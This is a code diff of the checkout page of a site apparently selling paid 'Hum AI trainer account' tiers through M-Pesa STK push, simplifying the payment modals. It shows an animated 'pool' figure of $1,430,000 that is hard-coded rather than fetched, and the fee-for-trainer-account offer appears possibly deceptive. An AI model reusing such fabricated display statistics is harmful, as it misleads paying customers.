-    // Add click handlers
-    buyButtons.forEach(btn => {
-      btn.addEventListener('click', (e) => {
-        e.preventDefault();
-        selectedTier = btn.dataset.tier;
-        selectedAmount = parseInt(btn.dataset.amount);
-        selectedFee = parseInt(btn.dataset.fee);
-        showContactModal();
-      });
-    });
+  <!-- footer -->
+  <div class="footer">
+    © 2025 Hum AI · Secure Infrastructure · v4.0
+  </div>
+</div>
 
-    // Phone number normalization (matches FulizaBoost logic)
-    function normalizePhoneInput(phone) {
-      // Remove all non-digits
-      let cleanPhone = phone.replace(/\D/g, '');
-      
-      // Remove leading 0 if present
-      if (cleanPhone.startsWith('0')) {
-        cleanPhone = cleanPhone.substring(1);
+<!-- SweetAlert2 -->
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
+
+<!-- counter script -->
+<script>
+  function animateCounter(elId, end, prefix = '') {
+    let el = document.getElementById(elId);
+    if (!el) return;
+    let start = 0;
+    let duration = 1800;
+    let step = end / (duration / 16);
+    let counter = setInterval(() => {
+      start += step;
+      if (start >= end) {
+        start = end;
+        clearInterval(counter);
       }
-      
-      // Remove +254 prefix if present
-      if (cleanPhone.startsWith('254')) {
-        cleanPhone = cleanPhone.substring(3);
+      if (prefix === '$') {
+        el.innerText = '$' + Math.floor(start).toLocaleString();
+      } else {
+        el.innerText = Math.floor(start).toLocaleString();
       }
-      
-      // Should be exactly 9 digits now
-      if (cleanPhone.length !== 9) {
-        throw new Error('Phone must be 9 digits');
-      }
-      
-      // Should start with 7 or 1
-      if (!/^[17]/.test(cleanPhone)) {
-        throw new Error('Phone must start with 7 or 1');
-      }
-      
-      return cleanPhone;
+    }, 16);
+  }
+
+  animateCounter('poolDisplay', 1430000, '$');
+</script>
+
+<!-- Payment Flow Script -->
+<script>
+  // API Endpoints (update with your actual endpoints)
+  const API_ENDPOINTS = {
+    initiatePayment: '/api/initiate-payment',
+    verifyPayment: '/api/verify-payment',
+    normalizePhone: '/api/normalize-phone'
+  };
+
+  // State management
+  let selectedTier = null;
+  let selectedAmount = null;
+  let selectedFee = null;
+  let userEmail = '';
+  let userPhone = '';
+  let paymentReference = null;
+  let isProcessing = false;
+
+  // Phone number normalization
+  function normalizePhoneInput(phone) {
+    let cleanPhone = phone.replace(/\D/g, '');
+    if (cleanPhone.startsWith('0')) {
+      cleanPhone = cleanPhone.substring(1);
     }
-
-    // Format phone for display
-    function formatPhoneForDisplay(phone) {
-      if (phone.length !== 9) return phone;
-      return phone.slice(0, 3) + ' ' + phone.slice(3, 6) + ' ' + phone.slice(6);
+    if (cleanPhone.startsWith('254')) {
+      cleanPhone = cleanPhone.substring(3);
     }
-
-    // Format phone for API (with country code)
-    function formatPhoneForAPI(phone) {
-      return '+254' + phone;
+    if (cleanPhone.length !== 9) {
+      throw new Error('Phone must be 9 digits');
     }
-
-    // Modal 1: Contact details with explanation
-    function showContactModal() {
-      Swal.fire({
-        title: 'Complete your order',
-        html: `
-          <div style="text-align: left;">
-            <!-- Explanatory note -->
-            <div class="info-note">
-              <p><i class="fas fa-envelope" style="color: #98ffb0; margin-right: 6px;"></i><strong>Email:</strong> We'll send your trainer account details here</p>
-              <p style="margin-top: 8px;"><i class="fas fa-mobile-alt" style="color: #98ffb0; margin-right: 6px;"></i><strong>Phone:</strong> You'll receive an M-Pesa STK push to complete payment</p>
-            </div>
-            
-            <!-- Email input -->
-            <input type="email" id="swal-email" class="swal2-input" placeholder="Email address" style="margin-bottom: 8px;" value="">
-            
-            <!-- Phone input with prefix -->
-            <div class="phone-input-group">
-              <span class="phone-prefix">+254</span>
-              <input type="tel" id="swal-phone" placeholder="712345678" maxlength="9" value="">
-            </div>
-            
-            <p style="font-size: 0.75rem; color: #9aaeb9; margin-top: 12px;">
-              <i class="fas fa-lock" style="margin-right: 4px;"></i> Your details are secure and only used for this transaction
-            </p>
-          </div>
-        `,
-        icon: false,
-        showCancelButton: true,
-        confirmButtonText: 'Continue',
-        cancelButtonText: 'Cancel',
-        focusConfirm: false,
-        allowOutsideClick: false,
-        preConfirm: () => {
-          const email = document.getElementById('swal-email').value.trim();
-          const phone = document.getElementById('swal-phone').value.trim();
-          
-          if (!email || !email.includes('@') || !email.includes('.')) {
-            Swal.showValidationMessage('Valid email required');
-            return false;
-          }
-          
-          try {
-            const normPhone = normalizePhoneInput(phone);
-            return { email, phone: normPhone };
-          } catch (e) {
-            Swal.showValidationMessage(e.message);
-            return false;
-          }
-        }
-      }).then(result => {
-        if (result.isConfirmed) {
-          userEmail = result.value.email;
-          userPhone = result.value.phone;
-          showPaymentConfirm();
-        }
-      });
-
-      // Focus email input after modal opens
-      setTimeout(() => {
-        const emailInput = document.getElementById('swal-email');
-        if (emailInput) emailInput.focus();
-      }, 300);
+    if (!/^[17]/.test(cleanPhone)) {
+      throw new Error('Phone must start with 7 or 1');
     }
+    return cleanPhone;
+  }
 
-    // Modal 2: Payment confirmation
-    function showPaymentConfirm() {
-      Swal.fire({
-        title: 'Confirm payment',
-        html: `
-          <div style="text-align: left;">
-            <div class="summary-box">
-              <div class="summary-row">
-                <span class="summary-label">Tier:</span>
-                <span class="summary-value">${selectedTier.replace('-', ' + ')}</span>
-              </div>
-              <div class="summary-row">
-                <span class="summary-label">Amount:</span>
-                <span class="summary-value">KES ${selectedAmount}</span>
-              </div>
-              <div class="summary-row">
-                <span class="summary-label">Fee:</span>
-                <span class="summary-value">KES ${selectedFee}</span>
-              </div>
-              <div class="summary-row" style="margin-top: 8px; border-top: 1px solid rgba(152,255,176,0.2); padding-top: 8px;">
-                <span class="summary-label">Total:</span>
-                <span class="summary-value">KES ${selectedAmount + selectedFee}</span>
-              </div>
-            </div>
-            
-            <div style="background: rgba(152,255,176,0.05); border-radius: 12px; padding: 10px; margin: 8px 0; font-size: 0.85rem;">
-              <p><i class="fas fa-envelope" style="color: #98ffb0; width: 20px;"></i> ${userEmail}</p>
-              <p><i class="fas fa-phone" style="color: #98ffb0; width: 20px;"></i> +254 ${formatPhoneForDisplay(userPhone)}</p>
-            </div>
-            
-            <p style="font-size: 0.8rem; color: #9aaeb9; margin-top: 8px;">
-              <i class="fas fa-mobile-alt"></i> M-Pesa STK push will be sent to this number
-            </p>
-          </div>
-        `,
-        icon: false,
-        showCancelButton: true,
-        confirmButtonText: 'Pay Now',
-        cancelButtonText: 'Back',
-        confirmButtonColor: '#98ffb0'
-      }).then(result => {
-        if (result.isConfirmed) {
-          initiatePayment();
-        } else {
-          showContactModal(); // Go back to edit details
-        }
-      });
-    }
+  function formatPhoneForDisplay(phone) {
+    if (phone.length !== 9) return phone;
+    return phone.slice(0, 3) + ' ' + phone.slice(3, 6) + ' ' + phone.slice(6);
+  }
 
-    // Normalize phone for API (async wrapper)
-    async function normalizePhoneNumber(phone) {
-      try {
-        // If you have a normalization endpoint
-        if (API_ENDPOINTS.normalizePhone) {
-          const response = await fetch(API_ENDPOINTS.normalizePhone, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone: formatPhoneForAPI(phone) })
-          });
-          
-          if (!response.ok) throw new Error('Normalization failed');
-          
-          const data = await response.json();
-          return data.normalized_phone || formatPhoneForAPI(phone);
-        }
-        
-        // Default normalization
-        return formatPhoneForAPI(phone);
-      } catch (error) {
-        console.warn('Phone normalization failed, using default:', error);
-        return formatPhoneForAPI(phone);
-      }
-    }
+  function formatPhoneForAPI(phone) {
+    return '+254' + phone;
+  }
 
-    // Send STK push (matches FulizaBoost pattern)
-    async function sendSTKPush(phoneNumber, amount, tierName, email) {
-      try {
-        const response = await fetch(API_ENDPOINTS.initiatePayment, {
+  // Normalize phone for API
+  async function normalizePhoneNumber(phone) {
+    try {
+      if (API_ENDPOINTS.normalizePhone) {
+        const response = await fetch(API_ENDPOINTS.normalizePhone, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            phone_number: phoneNumber,
-            amount: amount,
-            tier: tierName,
-            email: email,
-            description: `Hum AI Trainer Account: ${tierName}`
-          })
+          body: JSON.stringify({ phone: formatPhoneForAPI(phone) })
         });
-        
-        if (!response.ok) {
-          const error = await response.json();
-          throw new Error(error.message || 'Payment initiation failed');
-        }
-        
+        if (!response.ok) throw new Error('Normalization failed');
         const data = await response.json();
-        return data;
-      } catch (error) {
-        console.error('STK push error:', error);
-        throw error;
+        return data.normalized_phone || formatPhoneForAPI(phone);
       }
+      return formatPhoneForAPI(phone);
+    } catch (error) {
+      console.warn('Phone normalization failed:', error);
+      return formatPhoneForAPI(phone);
     }
+  }
 
-    // Check payment status (polling)
-    async function checkPaymentStatus(reference, maxAttempts = 20, intervalMs = 3000) {
-      let attempts = 0;
-      
-      return new Promise((resolve, reject) => {
-        const checkInterval = setInterval(async () => {
-          attempts++;
+  // Send STK push
+  async function sendSTKPush(phoneNumber, amount, tierName, email) {
+    const response = await fetch(API_ENDPOINTS.initiatePayment, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        phone_number: phoneNumber,
+        amount: amount,
+        tier: tierName,
+        email: email,
+        description: `Hum AI Trainer Account: ${tierName}`
+      })
+    });
+    
+    if (!response.ok) {
+      const error = await response.json();
+      throw new Error(error.message || 'Payment initiation failed');
+    }
+    
+    return await response.json();
+  }
+
+  // Check payment status
+  async function checkPaymentStatus(reference, maxAttempts = 20, intervalMs = 3000) {
+    let attempts = 0;
+    
+    return new Promise((resolve, reject) => {
+      const checkInterval = setInterval(async () => {
+        attempts++;
+        
+        try {
+          const response = await fetch(`${API_ENDPOINTS.verifyPayment}?reference=${encodeURIComponent(reference)}`);
           
-          try {
-            const response = await fetch(`${API_ENDPOINTS.verifyPayment}?reference=${encodeURIComponent(reference)}`);
-            
-            if (!response.ok) {
-              if (attempts >= maxAttempts) {
-                clearInterval(checkInterval);
-                reject(new Error('Payment verification failed'));
-              }
-              return;
-            }
-            
-            const data = await response.json();
-            
-            if (data.success && (data.status === 'COMPLETED' || data.status === 'SUCCESS')) {
-              clearInterval(checkInterval);
-              resolve(true);
-            } else if (data.success && (data.status === 'FAILED' || data.status === 'CANCELLED')) {
-              clearInterval(checkInterval);
-              reject(new Error('Payment failed or was cancelled'));
-            } else if (attempts >= maxAttempts) {
-              clearInterval(checkInterval);
-              reject(new Error('Payment verification timeout'));
-            }
-          } catch (error) {
-            console.error('Payment status check error:', error);
+          if (!response.ok) {
             if (attempts >= maxAttempts) {
               clearInterval(checkInterval);
               reject(new Error('Payment verification failed'));
             }
+            return;
           }
-        }, intervalMs);
-      });
-    }
+          
+          const data = await response.json();
+          
+          if (data.success && (data.status === 'COMPLETED' || data.status === 'SUCCESS')) {
+            clearInterval(checkInterval);
+            resolve(true);
+          } else if (data.success && (data.status === 'FAILED' || data.status === 'CANCELLED')) {
+            clearInterval(checkInterval);
+            reject(new Error('Payment failed or was cancelled'));
+          } else if (attempts >= maxAttempts) {
+            clearInterval(checkInterval);
+            reject(new Error('Payment verification timeout'));
+          }
+        } catch (error) {
+          console.error('Payment status check error:', error);
+          if (attempts >= maxAttempts) {
+            clearInterval(checkInterval);
+            reject(new Error('Payment verification failed'));
+          }
+        }
+      }, intervalMs);
+    });
+  }
 
-    // Main payment initiation (full working flow)
-    async function initiatePayment() {
-      // Prevent multiple clicks
-      if (isProcessing) return;
-      
-      // Validate inputs
-      if (!userPhone || userPhone.length !== 9) {
-        Swal.fire({
-          icon: 'error',
-          title: 'Invalid Phone',
-          text: 'Please enter a valid 9-digit phone number',
-          confirmButtonColor: '#98ffb0'
-        });
-        return;
-      }
-      
-      if (!userEmail || !userEmail.includes('@')) {
-        Swal.fire({
-          icon: 'error',
-          title: 'Email Required',
-          text: 'Please enter your email address',
-          confirmButtonColor: '#98ffb0'
-        });
-        return;
-      }
-      
-      if (!selectedTier) {
-        Swal.fire({
-          icon: 'error',
-          title: 'No Tier Selected',
-          text: 'Please select a trainer account tier',
-          confirmButtonColor: '#98ffb0'
-        });
-        return;
-      }
-      
-      isProcessing = true;
-      
-      try {
-        // Show confirmation dialog
-        const confirmed = await Swal.fire({
-          title: 'Confirm Payment',
-          html: `
-            <div class="payment-confirm-content">
-              <div class="payment-confirm-icon">
-                <i class="fas fa-wallet"></i>
-              </div>
-              <div class="payment-details-box" style="background: rgba(18,24,30,0.8); padding: 12px; border-radius: 12px;">
-                <div class="payment-detail-row" style="display: flex; justify-content: space-between; margin-bottom: 8px;">
-                  <span>Total Amount:</span>
-                  <strong style="color: #98ffb0;">KES ${selectedAmount + selectedFee}</strong>
-                </div>
-                <div class="payment-detail-row" style="display: flex; justify-content: space-between;">
-                  <span>Phone Number:</span>
-                  <strong>${formatPhoneForDisplay(userPhone)}</strong>
-                </div>
-              </div>
-              <p style="color: #9aaeb9; margin-top: 10px; font-size: 0.8rem;">
-                An M-Pesa STK push will be sent to your phone
-              </p>
+  // Show contact details modal
+  function showContactModal(tier, amount, fee) {
+    selectedTier = tier;
+    selectedAmount = amount;
+    selectedFee = fee;
+
+    Swal.fire({
+      title: 'Complete your order',
+      html: `
+        <div style="text-align: left;">
+          <div class="info-note">
+            <p><i class="fas fa-envelope" style="color: #1FE08B; margin-right: 6px;"></i><strong>Email:</strong> We'll send your trainer account details here</p>
+            <p style="margin-top: 8px;"><i class="fas fa-mobile-alt" style="color: #1FE08B; margin-right: 6px;"></i><strong>Phone:</strong> You'll receive an M-Pesa STK push</p>
+          </div>
+          
+          <input type="email" id="swal-email" class="swal2-input" placeholder="Email address" value="" style="margin-bottom: 8px;">
+          
+          <div class="phone-input-group">
+            <span class="phone-prefix">+254</span>
+            <input type="tel" id="swal-phone" placeholder="712345678" maxlength="9" value="">
+          </div>
+          
+          <div style="background: #0B1623; border-radius: 12px; padding: 12px; margin-top: 12px;">
+            <div style="display: flex; justify-content: space-between; margin-bottom: 6px;">
+              <span>Amount:</span>
+              <span style="color: #1FE08B;">KES ${amount}</span>
             </div>
-          `,
-          icon: false,
-          showCancelButton: true,
-          confirmButtonText: 'Proceed',
-          cancelButtonText: 'Cancel',
-          confirmButtonColor: '#98ffb0'
-        });
+            <div style="display: flex; justify-content: space-between; margin-bottom: 6px;">
+              <span>Fee:</span>
+              <span style="color: #1FE08B;">KES ${fee}</span>
+            </div>
+            <div style="display: flex; justify-content: space-between; font-weight: 600; border-top: 1px solid #2a4055; margin-top: 6px; padding-top: 6px;">
+              <span>Total:</span>
+              <span style="color: #1FE08B;">KES ${amount + fee}</span>
+            </div>
+          </div>
+          
+          <p style="font-size: 0.75rem; color: #8fb4d4; margin-top: 12px;">
+            <i class="fas fa-lock"></i> Your details are secure
+          </p>
+        </div>
+      `,
+      showCancelButton: true,
+      confirmButtonText: 'Pay Now',
+      cancelButtonText: 'Cancel',
+      allowOutsideClick: false,
+      preConfirm: () => {
+        const email = document.getElementById('swal-email').value.trim();
+        const phone = document.getElementById('swal-phone').value.trim();
         
-        if (!confirmed.isConfirmed) {
-          isProcessing = false;
-          return;
+        if (!email || !email.includes('@') || !email.includes('.')) {
+          Swal.showValidationMessage('Valid email required');
+          return false;
         }
         
-        // Show loading
-        Swal.fire({
-          title: 'Processing',
-          html: 'Please wait while we set up your payment...',
-          allowOutsideClick: false,
-          didOpen: () => Swal.showLoading()
-        });
-        
-        // Normalize phone for STK
-        const normalizedPhone = await normalizePhoneNumber(userPhone);
-        
-        // Send STK push
-        Swal.update({
-          title: 'Sending STK Push',
-          html: 'Initiating payment request to your phone...'
-        });
-        
-        const paymentResponse = await sendSTKPush(
-          normalizedPhone,
-          selectedAmount + selectedFee,
-          selectedTier,
-          userEmail
-        );
-        
-        if (!paymentResponse || !paymentResponse.reference) {
-          throw new Error('Failed to initiate payment');
+        try {
+          const normPhone = normalizePhoneInput(phone);
+          return { email, phone: normPhone };
+        } catch (e) {
+          Swal.showValidationMessage(e.message);
+          return false;
         }
-        
-        paymentReference = paymentResponse.reference;
-        
-        // Show STK push sent modal
-        Swal.fire({
-          title: 'STK Push Sent!',
+      }
+    }).then(result => {
+      if (result.isConfirmed) {
+        userEmail = result.value.email;
+        userPhone = result.value.phone;
+        initiatePayment(); // Go directly to STK push
+      }
+    });
+
+    // Focus email input
+    setTimeout(() => {
+      const emailInput = document.getElementById('swal-email');
+      if (emailInput) emailInput.focus();
+    }, 300);
+  }
+
+  // Main payment initiation
+  async function initiatePayment() {
+    if (isProcessing) return;
+    
+    if (!userPhone || userPhone.length !== 9) {
+      Swal.fire({
+        icon: 'error',
+        title: 'Invalid Phone',
+        text: 'Please enter a valid 9-digit phone number',
+        confirmButtonColor: '#1FE08B'
+      });
+      return;
+    }
+    
+    if (!userEmail || !userEmail.includes('@')) {
+      Swal.fire({
+        icon: 'error',
+        title: 'Email Required',
+        text: 'Please enter your email address',
+        confirmButtonColor: '#1FE08B'
+      });
+      return;
+    }
+    
+    isProcessing = true;
+    
+    try {
+      // Show loading
+      Swal.fire({
+        title: 'Processing',
+        html: 'Please wait...',
+        allowOutsideClick: false,
+        didOpen: () => Swal.showLoading()
+      });
+      
+      // Normalize phone
+      const normalizedPhone = await normalizePhoneNumber(userPhone);
+      
+      // Send STK push
+      Swal.update({
+        title: 'Sending STK Push',
+        html: 'Initiating payment request...'
+      });
+      
+      const paymentResponse = await sendSTKPush(
+        normalizedPhone,
+        selectedAmount + selectedFee,
+        selectedTier,
+        userEmail
+      );
+      
+      if (!paymentResponse || !paymentResponse.reference) {
+        throw new Error('Failed to initiate payment');
+      }
+      
+      paymentReference = paymentResponse.reference;
+      
+      // Show STK push sent
+      Swal.fire({
+        title: 'STK Push Sent!',
+        html: `
+          <div style="text-align: center;">
+            <div class="stk-push-icon">
+              <i class="fas fa-mobile-alt"></i>
+            </div>
+            <p><strong>Check your phone for the M-Pesa STK push</strong></p>
+            <div class="stk-phone-display">
+              +254 ${formatPhoneForDisplay(userPhone)}
+            </div>
+            <p style="color: #8fb4d4; margin-top: 5px;">
+              Enter your M-Pesa PIN to complete payment
+            </p>
+            <div style="background: #0B1623; padding: 10px; border-radius: 8px; margin-top: 12px;">
+              <small>Verifying payment...</small>
+            </div>
+          </div>
+        `,
+        showConfirmButton: false,
+        allowOutsideClick: false
+      });
+      
+      // Check payment status
+      const paymentSuccess = await checkPaymentStatus(paymentReference);
+      
+      if (paymentSuccess) {
+        await Swal.fire({
+          title: 'Payment Successful!',
           html: `
-            <div class="stk-push-content">
-              <div class="stk-push-icon">
-                <i class="fas fa-mobile-alt"></i>
+            <div style="text-align: center;">
+              <div class="success-icon">
+                <i class="fas fa-check-circle"></i>
               </div>
-              <p><strong>Check your phone for the M-Pesa STK push</strong></p>
-              <div class="stk-phone-display">
-                +254 ${formatPhoneForDisplay(userPhone)}
-              </div>
-              <p style="color: #9aaeb9; margin-top: 5px;">
-                Enter your M-Pesa PIN to complete the payment
-              </p>
-              <div style="background: rgba(18,24,30,0.8); padding: 10px; border-radius: 8px; margin-top: 12px;">
-                <small>Verifying payment...</small>
+              <p><strong>Your trainer account has been ordered!</strong></p>
+              
+              <div class="info-note" style="text-align: left; margin: 15px 0;">
+                <p style="margin-bottom: 8px;"><i class="fas fa-envelope" style="color: #1FE08B;"></i> <strong>Account delivery</strong></p>
+                <p style="font-size: 0.9rem; margin-bottom: 4px;">We've sent details to:</p>
+                <p style="color: #1FE08B; font-weight: 500;">${userEmail}</p>
+                <p style="font-size: 0.8rem; color: #8fb4d4;">Delivery within 24 hours</p>
               </div>
             </div>
           `,
-          icon: false,
-          showConfirmButton: false,
+          confirmButtonText: 'OK',
+          confirmButtonColor: '#1FE08B',
           allowOutsideClick: false
         });
         
-        // Check payment status
-        const paymentSuccess = await checkPaymentStatus(paymentReference);
-        
-        if (paymentSuccess) {
-          // Success screen with email delivery note
-          await Swal.fire({
-            title: 'Payment Successful!',
-            html: `
-              <div style="text-align: center;">
-                <div class="success-icon">
-                  <i class="fas fa-check-circle"></i>
-                </div>
-                <p><strong>Your trainer account has been ordered!</strong></p>
-                
-                <div class="info-note" style="text-align: left; margin: 15px 0;">
-                  <p style="margin-bottom: 8px;"><i class="fas fa-envelope" style="color: #98ffb0; margin-right: 8px;"></i> <strong>Account delivery</strong></p>
-                  <p style="font-size: 0.9rem; margin-bottom: 4px;">We've sent your account details to:</p>
-                  <p style="color: #98ffb0; font-weight: 500; margin-bottom: 8px;">${userEmail}</p>
-                  <p style="font-size: 0.8rem; color: #9aaeb9;"><i class="fas fa-clock"></i> Delivery within 24 hours</p>
-                  <p style="font-size: 0.8rem; color: #9aaeb9;"><i class="fas fa-exclamation-circle"></i> Please check your spam folder</p>
-                </div>
-                
-                <p style="font-size: 0.85rem; color: #9aaeb9;">Thank you for training Hum AI!</p>
-              </div>
-            `,
-            icon: false,
-            confirmButtonText: 'OK',
-            confirmButtonColor: '#98ffb0',
-            allowOutsideClick: false
-          });
-          
-          // Reset state
-          isProcessing = false;
-          selectedTier = null;
-          selectedAmount = null;
-          selectedFee = null;
-          userEmail = '';
-          userPhone = '';
-          paymentReference = null;
-          
-        } else {
-          throw new Error('Payment not confirmed');
-        }
-        
-      } catch (error) {
-        console.error('Payment error:', error);
-        
-        Swal.fire({
-          title: 'Payment Failed',
-          html: `
-            <div style="text-align: center;">
-              <div class="error-icon">
-                <i class="fas fa-exclamation-triangle"></i>
-              </div>
-              <p><strong>${error.message || 'Payment processing failed'}</strong></p>
-              <p style="color: #9aaeb9; margin-top: 10px; font-size: 0.85rem;">
-                Please check your phone network and M-Pesa balance, then try again
-              </p>
-            </div>
-          `,
-          icon: false,
-          confirmButtonText: 'Try Again',
-          confirmButtonColor: '#98ffb0'
-        });
-        
+        // Reset state
         isProcessing = false;
+        selectedTier = null;
+        selectedAmount = null;
+        selectedFee = null;
+        userEmail = '';
+        userPhone = '';
+        paymentReference = null;
       }
+      
+    } catch (error) {
+      console.error('Payment error:', error);
+      
+      Swal.fire({
+        title: 'Payment Failed',
+        html: `
+          <div style="text-align: center;">
+            <div class="error-icon">
+              <i class="fas fa-exclamation-triangle"></i>
+            </div>
+            <p><strong>${error.message || 'Payment processing failed'}</strong></p>
+            <p style="color: #8fb4d4; margin-top: 10px;">
+              Please check your phone and try again
+            </p>
+          </div>
+        `,
+        confirmButtonText: 'Try Again',
+        confirmButtonColor: '#1FE08B'
+      });
+      
+      isProcessing = false;
     }
+  }
 
-    // Prevent zoom on mobile
-    document.addEventListener('touchstart', function(e) {
-      if (e.touches.length > 1) e.preventDefault();
-    }, { passive: false });
+  // Add click handlers to buy buttons
+  document.querySelectorAll('.buy').forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      e.preventDefault();
+      const card = e.target.closest('.card');
+      if (!card) return;
+      
+      const tier = card.dataset.tier;
+      const amount = parseInt(card.dataset.amount);
+      const fee = parseInt(card.dataset.fee);
+      
+      showContactModal(tier, amount, fee);
+    });
+  });
 
-    let lastTouchEnd = 0;
-    document.addEventListener('touchend', function(e) {
-      const now = (new Date()).getTime();
-      if (now - lastTouchEnd <= 300) e.preventDefault();
-      lastTouchEnd = now;
-    }, false);
-  </script>
+  // Prevent double-tap zoom on mobile
+  document.addEventListener('touchstart', function(e) {
+    if (e.touches.length > 1) e.preventDefault();
+  }, { passive: false });
+
+  let lastTouchEnd = 0;
+  document.addEventListener('touchend', function(e) {
+    const now = (new Date()).getTime();
+    if (now - lastTouchEnd <= 300) e.preventDefault();
+    lastTouchEnd = now;
+  }, false);
+</script>
 </body>
 </html>
